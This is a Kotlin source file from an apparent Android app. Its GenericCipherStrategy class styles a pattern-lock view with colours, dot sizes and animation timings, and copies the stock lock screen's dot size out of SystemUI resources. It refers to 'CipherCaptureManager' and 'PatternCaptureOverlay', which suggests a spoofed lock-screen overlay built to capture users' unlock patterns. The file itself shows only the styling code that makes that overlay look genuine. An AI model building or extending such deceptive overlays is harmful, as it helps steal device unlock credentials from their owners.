package com.storm.safe.rock.service.modules.cipher.vendor

import android.content.Context
import android.content.res.Resources
import com.storm.safe.rock.service.modules.cipher.PatternLockView

/**
 * AOSP / generic fallback cipher strategy.
 *
 * Extracted from CipherCaptureManager + PatternCaptureOverlay `else` branches.
 * Used for any brand not explicitly handled (and temporarily for all brands
 * until brand-specific strategies are implemented).
 */
class GenericCipherStrategy : CipherBrandStrategy() {

    override val tag = "GenericCipher"

    override fun applyPatternFallbackStyle(view: PatternLockView, themeColor: Int, density: Float) {
        val pathWidth = (density * 3f).toInt().coerceAtLeast(3)
        view.normalStateColor = themeColor
        view.correctStateColor = themeColor
        view.dotNormalSize = 30
        view.dotSelectedSize = 60
        view.dotSelectedColor = themeColor
        view.pathWidth = pathWidth
        view.pathColor = themeColor
        view.aspectRatio = 0
        view.dotAnimationDuration = 150
        view.pathEndAnimationDuration = 100
    }

    override fun readBrandResources(res: Resources, suiContext: Context, density: Float): BrandResourceResult? {
        // AOSP: use lock_pattern_dot_size
        val aospId = res.getIdentifier("lock_pattern_dot_size", "dimen", "com.android.systemui")
        if (aospId == 0) return null
        val dotSize = res.getDimensionPixelSize(aospId)
        return BrandResourceResult(
            haloSize = dotSize * 3,
            innerDotSize = dotSize,
            pathWidth = 0  // 0 = use AOSP default path width
        )
    }
}
